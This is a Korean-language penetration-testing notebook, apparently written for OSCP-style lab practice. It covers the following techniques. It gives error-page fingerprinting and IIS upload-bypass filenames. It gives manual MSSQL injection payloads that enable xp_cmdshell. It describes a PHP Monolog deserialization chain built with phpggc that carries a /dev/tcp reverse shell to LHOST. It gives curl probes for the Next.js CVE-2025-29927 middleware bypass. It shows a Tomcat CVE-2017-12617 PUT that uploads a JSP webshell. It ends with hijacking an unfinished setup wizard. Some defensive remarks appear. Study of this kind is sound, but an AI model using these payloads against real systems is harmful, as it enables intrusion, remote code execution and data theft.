|---|---|---|
| `/root/*` | root | **RCE = root.** 권한상승 단계가 통째로 없음 |
| `/home/<user>/*` | 그 사용자 | 권한상승 1단계 필요 |
| `/var/www/*` | `www-data` | 표준 웹 계정 |
| `C:\wamp\` · `C:\xampp\` | 번들 스택 계정 | [[Squid]] 의 `phpinfo` 가 그 사례 |

[[pyLoader]] 실측 — 정보 페이지가 `Config Folder: /root/.pyload` 와 `Download Folder: /root/Downloads/pyLoad` 를 렌더했음. **일반 계정은 `/root/` 아래에 디렉터리를 만들 수 없으므로 그 프로세스는 root 임.** 이것을 **익스플로잇을 던지기 «전»에** 알았기 때문에 셸을 잡은 뒤 `linpeas` 를 돌리는 10분을 아꼈음.
- 두 경로가 **서로 다른 설정 항목**이라 그대로 독립 근거 2개가 됨(A-11)
- `Installation Folder: /usr/local/lib/python3.10/dist-packages/pyload` 는 **어떻게 그렇게 됐는지**까지 말해줌 — `sudo pip install <패키지>` 로 시스템 전역 설치한 뒤 root 셸에서 그냥 실행한 형태임. systemd 유닛에 `User=<서비스계정>` 을 지정했다면 foothold 는 비특권 계정이었음

→ **어떻게 설치했는가가 뚫렸을 때 얼마나 아픈가를 결정함.** 방어 쪽 조치도 같은 줄에 있음 — `User=`·`ProtectSystem=strict`·`PrivateTmp=yes`·`NoNewPrivileges=yes`.
→ **셸을 잡으면 `id` 부터 치는 이유**가 이것임(C-2). 누가 그 프로세스를 실행하는가 쪽은 B-34.

#### B-1-41. 개발 서버 배너를 보면 dirbust 대신 «일부러 500»

**탐지 신호** — 응답 헤더나 nmap `http-server-header` 에 **개발용 웹서버** 이름이 뜸. 운영에서는 안 쓰는 것들임.

| 배너 | 프레임워크 | 기대되는 것 |
|---|---|---|
| `WEBrick/x.y.z (Ruby/…)` | Sinatra · Rails(dev) | `show_exceptions` 백트레이스 |
| `Werkzeug/x.y.z Python/3.x` | Flask(dev) | 백트레이스 + `/console` 디버거 PIN |
| `WSGIServer/x.y CPython/3.x` | Django(dev) | `DEBUG=True` 페이지에 설정·환경변수까지 |
| `Node.js`·`Express` + `X-Powered-By` | Express | 스택 트레이스 |
| PHP 내장(`php -S`) | — | 라우팅이 파일시스템 기반이라 **오히려 dirbust 유효** |

**배너를 보면 열거 순서를 바꿈 — dirbust 보다 「일부러 500 내기」가 먼저임.** 500 유발 수법: 필수 파라미터 제거 · 타입 뒤집기(`x=1` → `x[]=1`) · 초장문 문자열 · `%00`·`%ff` 같은 비정상 인코딩.

**한 번의 잘못된 요청이 주는 것** — 프레임워크 3층, gem·패키지 **전체 버전 목록**, 앱 소스 **파일명과 행번호**, 그리고 조립된 **명령행 원문**(있다면, A-12). 디렉터리 열거보다 빠르고 정확함.
```bash
grep -oE 'gems/[a-z-]+-[0-9.]+' err.html | sort -u
```
경로 패턴만 바꾸면 언어 무관하게 재사용됨 — Ruby `gems/[a-z-]+-[0-9.]+` · Python `site-packages/([a-z_]+)/` · Node `node_modules/([a-z-]+)/` · Java `WEB-INF/lib/[a-z-]+-[0-9.]+\.jar`.

**백트레이스는 «아래에서 위로» 읽음** — 맨 아래가 요청을 받은 웹서버, 그 위가 프레임워크 디스패치, 그 위가 **앱 소스 파일명**, 맨 위가 실제 터진 지점임. 앱 파일명(`app.rb`·`urls.py`)이 여기서 공짜로 나오고 **권한상승 단계에서 그 파일이 다시 등장하는 경우가 많음**([[RubyDome]] 의 `sudo -l` 대상이 정확히 그 `app.rb` 였음, A-43).

**Sinatra 판별 지문** — 404 에 `X-Cascade: pass` 헤더와 `Sinatra doesn't know this ditty.` 문구가 옴. 그 지문을 본 순간 워드리스트 열거는 접을 것(A-16).

**출처** — [[RubyDome]](WEBrick → PDFKit 0.8.6 확정, 정찰 2분) · [[Levram]](`WSGIServer`). 버전 지문으로서의 traceback 일반론은 A-13.

**PHP 판 지문 — Whoops.** Laravel·Grav·Slim 등이 쓰는 에러 핸들러임. 응답이 200KB 대로 튀면 그것이 신호이고, 얻는 것은 **웹루트 절대경로 + 전체 스택 프레임(앱 소스 파일명)** 임.
```bash
grep -oE 'Undefined index: [a-z]+|/var/www/[^"]+\.php' err.html | sort -u
```
[[Astronaut]] 실측 — `curl -s -o w.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n' 'http://TARGET/grav-admin/%23.txt'` 가 `HTTP=500 SIZE=218880` 을 냈고, `Undefined index: path` 와 함께 `/var/www/html/grav-admin/system/src/Grav/Common/Processors/SchedulerProcessor.php` 를 포함한 프레임 16종이 나왔음. **`SchedulerProcessor.php` 가 프레임에 있는 것 자체가 스케줄러 파이프라인의 존재를 알려줌** — 뒤에 그 스케줄러가 공격 표적이 됐음.

⚠️ **500 유발은 «의도하지 않아도» 일어남 — 디렉터리 브루트 결과에서 500 이 몰려 있으면 그것이 곧 성공 신호임.** [[Astronaut]] `gobuster_grav.log` 는 워드리스트(`directory-list-2.3-medium.txt`)의 **주석 줄이 그대로 요청되어** 500 을 무더기로 만들어냈음:
```text
/# directory-list-2.3-medium.txt (Status: 500) [Size: 218947]
/#.json               (Status: 500) [Size: 218879]
/# Copyright 2007 James Fisher.txt (Status: 500) [Size: 218959]
```
— 출처: `~/PG/Astronaut/gobuster_grav.log`

`#` 로 시작하는 항목이 **전부 500**, 크기가 약 218KB 로 균일함. 워드리스트 주석은 보통 **노이즈로 걸러 버리는 대상**인데 여기서는 그것이 「이 앱은 `#` 를 경로에 받으면 디버그 페이지를 뱉는다」를 알려준 채널이었음.
→ **브루트 결과를 상태코드별로 집계할 것.** 500 이 한 무더기이고 크기가 균일하면 「스캔이 서버를 괴롭혔다」가 아니라 **「에러 페이지가 열려 있다」** 임(A-1-13 의 크기 집계와 같은 수법).

#### B-1-42. IIS · ASP.NET — 실행·거부 확장자 뒤에 «정적 확장자»를 덧붙인다

**ASP.NET 확장자는 셋으로 갈림:**

| 부류 | 확장자 | 결과 |
|---|---|---|
| 실행 | `.aspx` · `.ashx` · `.asmx` | 코드로 실행 |
| 거부 | `.master` · `.cs` · `.config` · `.asax` | `HttpForbiddenHandler` + IIS 요청 필터링으로 `404.7` |
| **매핑 없음** | `.txt` · `.bak` · `.old` · `~` | **정적 파일로 원문 그대로** |

**`.cs` 자체를 요청하는 것은 의미가 없음.** 덧붙이는 정적 확장자가 핵심임:
```text
default.aspx.txt   default.aspx.bak   default.aspx.old   default.aspx~
web.config.txt     web.config.bak     global.asax.txt
site.master.cs.txt site.master.txt    login.aspx.cs.bak
*.zip  *.rar  *.7z
```
사본이 없으면 남은 경로는 다운로드·뷰어 엔드포인트(`download.aspx?file=`)나 경로 순회뿐. 같은 계열 — PHP 의 `index.php.bak`, Java 의 `WEB-INF/web.xml`, Node 의 `.env`, [[Hawat]] 의 노출된 소스 zip(B-1-21).
⚠️ **IIS Directory Browsing 은 기본 비활성**이므로 켜져 있다는 것 자체가 개발자가 의도적으로 켰다는 뜻이고, **그런 디렉터리에는 대개 배포되면 안 되는 것이 있음.**

**업로드 필터 우회 사다리(IIS 판) — 위에서부터 순서대로 밀 것:**

| 시도 | 노리는 허점 |
|---|---|
| `shell.aspx` | 필터 없음 |
| `shell.ashx` · `shell.asmx` | 블랙리스트 누락([[Butch]] 에서 사용 — 다만 그 박스에 필터가 실제로 있었는지는 **미확인**) |
| `shell.AspX` · `shell.ASHX` | 대소문자 비교 누락(Windows FS 는 대소문자 무시 → 실행됨, A-1-25) |
| `shell.aspx.txt` → `shell.txt.aspx` | 확장자 파싱 방향 착각 |
| `shell.aspx%00.jpg` | 널바이트 절단(구형 .NET) |
| `shell.aspx.` · `shell.aspx `(후행 점·공백) | Windows 가 저장 시 제거함 |
| `shell.aspx:.jpg` | NTFS ADS. ⚠️ **단독으로는 불충분함** — 본문이 `.jpg` 대체 스트림에 들어가고 실제로 실행되는 기본 스트림은 **0바이트**가 됨. 필터 통과 확인용이지 동작하는 웹셸이 아님 |
| `shell.asp::$DATA` | NTFS ADS 고전형. `::$DATA` 는 **기본 스트림 자체의 별칭**이라 본문이 정상 위치에 들어감 — 확장자 비교만 하는 필터를 통과하면서 **실행까지 되는 쪽은 이것임** |
| `web.config` 업로드 | 필터가 실행 확장자만 볼 때. `web.config` 자체가 핸들러를 새로 정의해 `.jpg` 를 실행시킬 수 있음 |
| `../` 를 파일명에 삽입 | 경로 순회로 웹루트에 직접 배치 |

Content-Type 헤더만 `image/jpeg` 로 바꾸면 되는 경우도 흔함. **Burp Repeater 에서 확장자와 Content-Type 을 따로따로 바꿔가며 어느 쪽을 검사하는지 좁힐 것**(B-1-20). 「서버가 무엇을 PHP·ASP.NET 핸들러로 넘기는가」를 먼저 묻는 쪽은 B-1-36.

**출처** — [[Butch]](`site.master.txt` 가 유일한 소스 유출 경로였음).

#### B-1-43. 수동 MSSQL SQLi 절차 — sqlmap 금지 대비

**sqlmap 이면 `--dbms=mssql --technique=S --sql-query="update …"` 한 줄이지만 시험에서 sqlmap 은 명시적 금지임**(E 절). MSSQL 수동 절차 전체를 여기 둠. 스택 쿼리 가부 판단은 B-1-25, MySQL time-based 판은 B-1-25.

**탐지**
```sql
'                     → 에러 (Unclosed quotation mark)
''                    → 정상
' or '1'='1           → 논리 우회 시도
' waitfor delay '0:0:5'--    → 5초 지연되면 blind 성립
```
**DBMS·버전 확인**(에러 기반 — 형변환 에러에 값이 실려 나옴)
```sql
' and 1=convert(int,@@version)--
' and 1=convert(int,db_name())--
' and 1=convert(int,(select system_user))--
```
**테이블·컬럼 열거**
```sql
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
' and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='users'))--
```
**UNION 추출**(컬럼 수는 `order by n` 으로 이진 탐색)
```sql
' order by 1--   ... ' order by 5--     ← 에러 나는 직전이 컬럼 수
' union select null,username,password_hash,null from users--
```
**blind**(에러도 UNION 도 막혔을 때)
```sql
' if(ascii(substring((select top 1 password_hash from users),1,1))>52) waitfor delay '0:0:5'--
```
**DB 계정이 sysadmin 이면 곧바로 RCE**
```sql
'; exec sp_configure 'show advanced options',1; reconfigure; --
'; exec sp_configure 'xp_cmdshell',1; reconfigure; --
'; exec xp_cmdshell 'whoami'; --
```
⛔ **MSSQL 스택 쿼리가 성립하면 `xp_cmdshell` 을 «먼저» 찔러볼 것 — 되면 업로드 단계 전체를 건너뜀.** [[Butch]] 는 이 경로를 시도하지 않았고, 성공했다면 SQLi 단계에서 곧바로 셸이 나왔을 자리임(A-2-27).
⚠️ **`xp_cmdshell` 의 실행 컨텍스트는 SQL Server 서비스 계정임** — 「SQL 안에서의 sysadmin」이지 「OS 관리자」가 아니므로 `SeImpersonatePrivilege` 등 다음 단계가 필요할 수 있음(B-46 · B-56).

**출처** — [[Butch]](MSSQL + ADO.NET, `UPDATE` 로 해시 덮어쓰기).

#### B-1-44. PHP 객체 역직렬화(PHP Object Injection) + phpggc

**`unserialize()` 는 데이터만 복원하지 않음 — 매직 메서드가 자동 실행됨.**
```php
class User { public $name = "alice"; public $admin = false; }
echo serialize(new User);
// O:4:"User":2:{s:4:"name";s:5:"alice";s:5:"admin";b:0;}
```

**포맷 읽는 법** — 이걸 읽을 줄 알아야 페이로드를 손으로 고칠 수 있음.

| 조각 | 뜻 |
|---|---|
| `O:4:"User"` | Object, 클래스명 길이 4, 클래스명 `User` |
| `:2:` | 프로퍼티 2개 |
| `s:4:"name"` | string, 길이 4, 값 `name`(프로퍼티 이름) |
| `s:5:"alice"` | 그 프로퍼티의 값 |
| `b:0` | boolean false |
| 그 외 | `i:` 정수 · `a:` 배열 · `N;` null |

**매직 메서드 — 개발자가 부르지 않아도 자동 실행됨.**

| 매직 메서드 | 자동 호출 시점 |
|---|---|
| `__construct()` | `new` 로 생성할 때 — **`unserialize()` 에서는 호출되지 않음** |
| `__wakeup()` | `unserialize()` 직후 |
| `__destruct()` | 객체 소멸 시(스크립트 종료·참조 해제) — **반드시 실행됨** |
| `__toString()` | 객체를 문자열로 쓸 때(`echo $obj`, 문자열 연결) |
| `__get()` · `__set()` | 없는 프로퍼티에 접근할 때 |
| `__call()` · `__invoke()` | 없는 메서드 호출 · 객체를 함수처럼 호출할 때 |

공격자가 클래스명과 프로퍼티 값을 정할 수 있으면 그 클래스의 `__destruct`·`__wakeup` 안 코드가 공격자 데이터로 실행됨. `__destruct` 는 예외가 나든 스크립트가 끝나든 어차피 불려 **방어 여지가 거의 없음.**

**POP 체인(Property-Oriented Programming chain)** — 현실 앱에 `__destruct() { system($this->cmd); }` 같은 친절한 클래스는 없음. 대신 이어붙임:
```text
A::__destruct()          → $this->handler->flush()      를 부른다
   └ B::flush()          → $this->target->write($data)  를 부른다
        └ C::write()     → call_user_func($this->fn, $arg)  ← 여기서 터진다
```
`A` 의 프로퍼티에 `B` 객체를, `B` 의 프로퍼티에 `C` 객체를 중첩해 직렬화 문자열에 넣어두면 `__destruct` 하나가 도미노처럼 굴러감. **각 단계는 그 자체로 정상 코드이고 위험한 것은 «조합»임.** 이것이 가젯 체인.

⚠️ **가젯은 앱 자기 코드가 아니라 `vendor/` 라이브러리에서 나옴.** Composer 로 설치되는 Monolog·Guzzle·Laravel·Symfony·Doctrine·PHPUnit(개발 의존성이 배포에 섞이는 사고가 잦음)이 단골. 그래서 **「이 앱에는 위험한 클래스가 없다」는 방어는 성립하지 않음** — `vendor/` 전체가 공격 표면임(B-18). 디렉터리 브루트포스에서 `301 /vendor` 가 뜨면 그 자체가 신호.

**phpggc — 알려진 체인을 미리 구현한 생성기.**
```bash
phpggc -l monolog                    # Monolog용 체인 목록
phpggc Monolog/RCE2 system 'id'      # 체인 생성 (직렬화 문자열이 stdout으로)
phpggc Monolog/RCE2 system 'id' -b   # base64로 인코딩해서 출력
```
- `-b` 가 중요함 — 직렬화 문자열에는 `"`·`;`·`{`·`}`·널바이트가 섞여 HTTP 파라미터로 그냥 넣으면 깨짐. 취약점이 애초에 base64 를 기대하는 경우가 많아 그대로 맞물림(B-81)
- **phpggc 는 익스플로잇이 아니라 페이로드 생성기임.** 타겟과 통신조차 하지 않아 msfvenom 과 같은 범주이고 **OSCP 에서 허용됨**(E 절)
- 같은 라이브러리에 RCE1·RCE2·RCE3… 가 있고 **체인마다 진입 클래스가 다름.** 가젯 체인의 모양은 기억으로 쓰지 말고 디스크의 PoC 를 열어 확인할 것(A-14)

**`Monolog/RCE2` 진입점은 `BufferHandler` 가 아니라 `SyslogUdpHandler` 임.** phpggc `gadgetchains/Monolog/RCE/2/chain.php` 는 `$vector = '__destruct'` 로 두고 `SyslogUdpHandler` 를 최상위에 놓은 뒤 그 `$socket` 프로퍼티에 `BufferHandler` 를 담음.

| 체인 조각 | 공격자가 심는 값 | 역할 |
|---|---|---|
| `SyslogUdpHandler` | 최상위 객체 | `__destruct` 를 가진 진입점. 아무것도 안 해도 요청 끝에 자동 실행 |
| `$socket` | `BufferHandler` 객체 | `SyslogUdpHandler` 가 「소켓을 닫는다」고 믿고 정리 메서드를 부르는 자리. **타입이 검사되지 않으므로 아무 객체나 넣을 수 있음** — 이것이 가젯 연결의 정체 |
| `$buffer` | `[[<OS 명령 문자열>, 'level' => null]]` | 레코드 배열 1개. `['<명령>']` 같은 평평한 배열이 아니라 한 겹 더 감싸인 형태라 `current()` 가 필요해짐 |
| `$bufferLimit` · `$bufferSize` · `$initialized` | `-1` · `-1` · `true` | 플러시가 실제로 일어나도록 맞춘 값. **틀리면 `flush()` 가 조기 반환해 체인이 조용히 죽음**(A-2-32) |
| `$processors` | `['current', 'system']` | `current($record)` 가 배열의 첫 원소(=명령 문자열)를 꺼내고, 그 반환값이 다음 반복에서 `system()` 의 인자가 됨 |
| `$level` | `N`(null) | `$record['level'] < $this->level` 조기 반환 회피 |

`['current', 'system']` 이 두 개인 이유는 **타입**임. `call_user_func($processor, $record)` 의 `$record` 는 배열이고 `system(배열)` 은 실패함. 첫 반복에서 `current()` 로 배열→문자열 변환, 그 결과가 재대입되어 두 번째 반복에서 `system('명령')` 이 됨. **타입이 안 맞는 지점을 표준 함수 하나로 변환해 통과시키는 것은 가젯 체인의 상투적 수법**이고 `current`·`array_pop`·`reset`·`end` 가 그 자리에 자주 쓰임.

**세 겹으로 포개진 페이로드:**

| 겹 | 내용 | 왜 필요한가 |
|---|---|---|
| ③ 바깥 | `serialize()` 된 객체 그래프 → base64 | 서버가 `base64_decode → unserialize` 하므로 이 형식이어야 발화 |
| ② 중간 | OS 명령 문자열 — `echo <b64> \| base64 -d \| bash` | 가젯 체인이 최종적으로 `system()` 에 넘길 인자 |
| ① 안쪽 | `bash -i >& /dev/tcp/<LHOST>/<PORT> 0>&1` 를 base64 인코딩 | 리버스셸 원문의 `&`·`>` 가 중간 경로에서 깨짐(B-81) |

**타입 검사로 보호되는 sink 는 «반대 타입»으로 우회함 — 이 카드의 핵심 반사.** `is_array()`·`is_string()`·`is_numeric()`·`isset()` 로 감싸인 「정규화」 코드를 보면 **반대 타입을 보내 그 코드를 건너뛸 수 있는지 먼저 볼 것.** PHP 는 `a[]=1`(배열)과 `a=1`(문자열)을 같은 HTTP 파라미터 문법으로 둘 다 표현할 수 있어 이 우회가 유독 쉬움. 같은 성질의 고전 사례가 `strcmp($pw, $_POST['pw'])` 에 배열을 보내 `NULL`(=`0` 으로 느슨 비교) 반환을 유도하는 인증 우회임.

**저장과 발화가 다른 함수·다른 요청에서 일어나는 2차(저장형) 역직렬화**라는 점도 함께 볼 것. 저장 시점에는 아무 일도 안 일어나므로 **「페이로드를 보냈는데 반응이 없다」가 실패로 보임.** 트리거 경로를 따로 쳐야 함.
**DB 에서 읽었다고 신뢰 경계 «안»이 아님.** 그 컬럼에 무엇이 들어갔는지를 결정한 것은 앞 단계의 `save()` 이고, 거기에 우회 가능한 타입 검사가 있었음. 필터링으로는 못 막음 — 유효한 직렬화 문자열의 형태는 무한하고 공격자는 `vendor/` 의 어떤 클래스든 지정할 수 있음.

**대책** — 사용자 데이터에 `unserialize()` 를 쓰지 않고 `json_decode()` 처럼 객체를 되살리지 않는 포맷으로 갈 것. PHP 7+ 의 `unserialize($data, ['allowed_classes' => false])` 는 **이미 설계가 틀어진 뒤의 완충재**임. 「클래스명 화이트리스트 검사」도 `allowed_classes` 를 지정하지 않은 `unserialize()` 가 파싱 시점에 이미 객체를 만들기 때문에 늦음. 「base64 로 인코딩했으니 안전」은 base64 가 보호가 아니라는 점에서 틀림.

**⛔ post-auth CVE 는 「인증이 필요한가」가 아니라 「어떤 «권한»이 필요한가」를 확인할 것.** [[Crane]] 의 CVE-2022-23940 은 PoC README 원문이 *"any user with permission to create Scheduled Reports can obtain remote code execution"* — **관리자 전용이 아님.** 저권한 계정 하나만 주워도 살아 있음. 「관리자 자격증명이 없으니 포기」로 판단하면 경로를 통째로 버림. **대개 생각보다 낮음.**
→ **작업 순서가 뒤집힘** — 취약점 찾기 → 익스플로잇이 아니라 **자격증명 확보가 먼저**임. CVE 를 먼저 던지고 「안 되네」라고 판단하면 시간을 태움(B-1-37).

**역직렬화의 지문 — 하나라도 보이면 의심:**

| 신호 | 어디서 보이는가 | 판단 |
|---|---|---|
| 파라미터·쿠키 값이 `O:`·`a:`·`s:` 로 시작 | `Cookie: user=O:4:"User":2:{...}` | PHP 직렬화 원문. 즉시 POP 체인 시도 |
| base64 디코드했더니 위 형태 | 폼 필드·쿠키·`state`·`data` 파라미터 | [[Crane]] 의 `email_recipients` 가 이 경우 |
| base64 가 `rO0AB` 로 시작 | Java 앱 | Java 직렬화 매직바이트 `AC ED 00 05`. ysoserial 대상 |
| base64 가 `gASV`·`gAJ` 로 시작 | Python 앱 | pickle 프로토콜 헤더. `__reduce__` 페이로드 |
| `AAEAAAD/////` | .NET 앱 | `BinaryFormatter`. ysoserial.net 대상 |
| 소스에 `unserialize(`·`readObject(`·`pickle.loads(`·`Marshal.load(`·`yaml.load(` | 화이트박스 리뷰 | 사용자 입력이 여기 닿는지만 추적하면 끝 |
| `vendor/monolog`·`vendor/guzzlehttp`·`vendor/symfony` 디렉터리 노출 | 디렉터리 브루트포스 결과 | 가젯 공급원 존재. phpggc 대상 라이브러리 목록과 대조 |

다른 언어의 대응물 — Java `readObject()`(ysoserial) · .NET `BinaryFormatter` · Python `pickle` · Ruby `Marshal.load`. `pickle.loads(사용자입력)` 을 보면 즉시 RCE 를 의심하는 반사와 같음. 입력 «형식»으로 취약점 부류를 좁히는 절차는 A-2-19.

**출처** — [[Crane]](SuiteCRM 7.12.3 · CVE-2022-23940 · `Monolog/RCE2`). 체인이 조용히 죽을 때는 A-2-32.

#### B-1-45. Next.js 미들웨어 인가 우회 (CVE-2025-29927) — 그리고 앞단 인가 우회 6벡터

**탐지 신호** — `X-Powered-By: Next.js` + 보호 라우트가 **307**(`location:` 헤더)로 튕김. `x-middleware-rewrite`·`x-middleware-next: 1` 응답 헤더, `/unauthorized` 류 착지 페이지 존재도 같은 신호임.

**메커니즘** — 미들웨어 재귀 실행을 막으려는 **내부 표식** `x-middleware-subrequest` 헤더를 실행기가 발신자 검증 없이 신뢰함. 외부 요청이 위조하면 미들웨어(= 유일한 인가 장치인 경우가 많음)가 통째로 스킵됨.

**버전별 헤더 값** — 「Pages Router 인가」가 아니라 **「12.2 이전인가」**가 판별 기준임:

| 버전대 | 미들웨어 파일 | 값 | 반복 |
|---|---|---|---|
| 11.1.4~12.1 | `pages/_middleware.ts` | `pages/_middleware` | 1회 |
| 12.2~15.x | 루트 `middleware.ts` | `middleware` | 1회 |
| `src/` 배치 | `src/middleware.ts` | `src/middleware` | 1회 |
| 15.x | 루트 `middleware.ts` | `middleware` | **5회 이상**(`MAX_RECURSION_DEPTH`) |

버전을 모를 때 쓰는 만능 값:
```text
middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware
```

**정탐/오탐 판정 — 헤더 «유무»만 다른 두 요청을 비교할 것.** `307 → /unauthorized` vs `헤더 있으면 200 + 보호 콘텐츠` 만 정탐임:
```bash
for h in "" "middleware" "src/middleware" "pages/_middleware" "middleware:middleware:middleware:middleware:middleware"; do
  printf '%-60s ' "${h:-none}"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' ${h:+-H "x-middleware-subrequest: $h"} http://TARGET:3000/admin
done
```
⚠️ **`curl -L`·Burp 의 "Follow redirections" 를 쓰면 우회 «성공»을 실패로 오판함** — 307 을 따라가 `/unauthorized` 본문만 보게 됨. 판정은 **상태코드 + 본문 크기**로(A-12 · A-15).

**패치** — 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5 이상. GHSA-f82v-jwr5-mffw, CVSS 9.1.

**라우트 열거는 워드리스트가 아니라 `_buildManifest.js` 로** — 스캐너의 자동 필터에 영향받지 않고 정확함:
```bash
curl -s http://TARGET:3000/ | grep -oE '/_next/static/[^/]+/_buildManifest\.js'
curl -s http://TARGET:3000/_next/static/<buildId>/_buildManifest.js | grep -oE '"/[^"]*"'
```
같은 원리 — Angular `main.*.js` · React `asset-manifest.json` · Vue `app.*.js`.

---

**일반화 — 앞단 인가(front-layer authorization) 는 필터지 인가가 아님.** 미들웨어·리버스 프록시·WAF·API 게이트웨이 전부 같음. 검증 질문 셋 — ① 필터를 우회하면 뒷단이 스스로 막는가 ② 뒷단에 직접 도달 가능한가(백엔드 포트 노출·SSRF) ③ 필터와 뒷단이 경로·메서드·헤더를 **동일하게 해석**하는가.

**403/307 로 튕기는 엔드포인트를 보면 「권한이 없다」가 아니라 「누가 막고 있는가」를 먼저 물을 것.** 순서대로 때릴 6벡터:

| # | 벡터 | 시도할 것 | 왜 통하는가 |
|---|---|---|---|
| 1 | **헤더 주입** | `x-middleware-subrequest` · `X-Forwarded-For: 127.0.0.1` · `X-Real-IP` · `X-Remote-User: admin` · `X-Original-URL: /admin` · `X-Rewrite-URL: /admin` | 앞단이 붙이는 내부 표식을 외부에서 지우지 않고 그대로 신뢰(B-15) |
| 2 | **경로 정규화 차이** | `//admin` · `/./admin` · `/admin/` · `/admin/.` · `/%61dmin` · `/%2561dmin` · `/admin;x=1` | 프록시는 리터럴 문자열로 매칭하고 백엔드는 **정규화 후** 라우팅함 |
| 3 | **메서드 변경** | `POST`·`HEAD`·`PUT`·`OPTIONS`·`TRACE`, `X-HTTP-Method-Override: GET` | 규칙이 `<Limit GET>` 처럼 특정 메서드에만 걸려 있음 |
| 4 | **HTTP 버전·파싱 불일치** | HTTP/1.0 요청, 절대 URI(`GET http://host/admin HTTP/1.1`), 헤더 중복·공백·`\t` 삽입 | 프록시와 백엔드의 파서 관대함이 다름 |
| 5 | **백엔드 직접 접근** | 앞단이 443 만 노출해도 백엔드 3000·8080 이 열려 있는지 확인 | 필터를 아예 지나치지 않음(B-72) |
| 6 | **대소문자** | `/Admin` · `/aDmIn` | 프록시 매칭은 대소문자 구분, 백엔드 라우팅은 무시(또는 반대, A-1-25) |

**뿌리는 하나 — 「파서가 둘 이상이면 해석이 갈린다」.** HTTP request smuggling 도 같은 형태임.

**자동 도구가 필요 없는 유형임** — 본질이 `curl -H` 한 줄이라 OSCP 자동 익스플로잇 금지 규정에서 오히려 유리함(E 절).

**출처** — [[MiddlewareBypass]].

#### B-1-46. Tomcat CVE-2017-12617 — PUT + 트레일링 슬래시로 확장자 매퍼 우회 (JSP 업로드 RCE)

**전제조건이 강해서 «먼저 30초 안에» 판정할 것.** 기본값이 안전 쪽이라 대부분의 박스에서 성립하지 않음:
```bash
curl -i -X OPTIONS http://TARGET:8080/
curl -i -X PUT -d 'x' http://TARGET:8080/probe.txt
```
- `readonly` 기본값은 **`true`** 이고 그러면 PUT/DELETE 가 **403** 임. `web.xml` 의 `DefaultServlet` 에서 `readonly=false` 로 «바꿔 놓은» 서버에서만 성립함
- 영향 범위 — 9.0.0.M1~9.0.0, 8.5.0~8.5.22, 8.0.0.RC1~8.0.46, 7.0.0~7.0.81 (전부 **Windows 한정**인 CVE-2017-12615 와 달리 12617 은 OS 무관)

**메커니즘** — 확장자 매퍼가 `.jsp` 를 잡아 JSP 서블릿으로 넘기는데, 파일명 끝에 **`/`(또는 Windows 에서 `::$DATA`·` `)** 를 붙이면 매퍼가 «JSP 가 아니다»로 판정해 `DefaultServlet` 이 처리함. 그런데 파일시스템에 쓰일 때는 그 문자가 정규화로 떨어져 **`shell.jsp` 로 저장됨.** 이후 정상 요청하면 JSP 로 실행됨.

```bash
curl -i -X PUT -d '<%= Runtime.getRuntime().exec(request.getParameter("c")) %>' \
     "http://TARGET:8080/shell.jsp/"
curl -s "http://TARGET:8080/shell.jsp?c=id"
```
⚠️ **`shell.jsp/` 의 후행 슬래시가 페이로드의 전부임** — 빼면 그냥 403·404 가 옴.

**대안 경로** — 같은 Tomcat 에서 `manager-script`·`manager-gui` 롤 자격증명을 얻었으면 WAR 배포가 더 확실함. **롤 이름이 `manager-gui` 단독이면 `/manager/text` API 는 못 씀**(브라우저 폼만 가능) — [[Sorcerer]] 가 그 경우였음.

`[가정]` [[Sorcerer]] 는 8080 Tomcat 7.0.4 를 보고 이 CVE 를 후보로 검토했으나 최종 경로에는 쓰지 않았음(다른 경로가 더 빨랐음). ⚠️ **`~/.zsh_history` 에 PoC 두 종을 6회 이상 실행한 기록이 있으나 출력이 보존되지 않아 결과는 「관측 없음」임** — 「전제조건에서 걸렸다」로 단정하지 말 것.

**출처** — [[Sorcerer]].

#### B-1-47. 설정 마법사가 미완료면 관리자 계정을 «선점»할 수 있다

**자체호스팅 제품·어플라이언스는 「설정 중」 상태에서 관리자 계정을 공격자가 선점할 수 있음.** 상태 머신이 `[설치 직후: 관리자 없음]` → `[설정 중: 무인증 마법사]` → `[운영: 전 경로 인증]` 인데, `[설정 중]` 에서는 **인증할 대상 계정 자체가 없어** 마법사가 무인증인 것이 «설계상 필연»임. 진짜 결함은 그 창구가 네트워크에 노출·방치된 것임.

**알아보는 신호(페이지 문구)** — "Configuration Wizard must be completed" · "Create the first admin account" · "Initial setup" · 가입·재설정 링크가 비정상적으로 열림.
**확인:**
```bash
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' http://TARGET:PORT/
```
후보 경로 — `/setup` `/install` `/wizard` `/Config-Wizard/` `/admin/setup` `/initial` `/onboarding` `/setup.cgi`.

⚠️ **선착순임 — 발견 즉시 잡을 것.** 상태 머신은 한 방향이라 관리자 계정이 이미 만들어져 있으면 이 경로는 죽음. **「정찰 마저 하고 돌아오는 사이에 사라질 수 있는 유일한 종류의 표면」** 임.

**정상 제품의 방어** — 설정 완료까지 `127.0.0.1` 로컬 바인딩 · 설치 토큰(디스크 파일 요구, Jenkins) · 시간 창 · 원격 IP 제한.

[[Hub]] — FuguHub 8.4 에서 `/Config-Wizard/wizard/SetAdmin.lsp` 무인증 POST(`email=&user=admin&password=`)로 관리자를 선점했음. 관리자 부재를 `/var/www/html/user.dat` **파일 존재 여부**로 판정 = **인증 검사가 상태 검사로 대체된 것**이 결함의 본체임. 생성 계정이 세 realm 전부의 주체라 곧바로 WebDAV 쓰기 → `.lsp` 업로드 RCE 로 이어졌음(B-1-36).
⚠️ **A-2-31(인스톨러 잔존물)과 다름** — 저쪽은 «잔존 파일» 함정이고 이쪽은 «미완료 상태 머신» 임.

#### B-1-48. 임의 파일 «쓰기»를 확보했다 — 무엇에 쓸 것인가

**임의 쓰기가 곧 코드 실행이 되려면 셋 중 하나가 필요함.**

| 조건 | 예 |
|---|---|
| ① 쓴 파일이 **코드로 파싱**됨 | `.php` 웹셸을 웹루트에 |
| ② 쓴 파일이 **템플릿 엔진**을 거침 | Twig·Jinja SSTI |
| ③ 쓴 파일이 **명령을 정의**함 | 크론·스케줄러·서비스 유닛·`.bashrc`·`authorized_keys` |

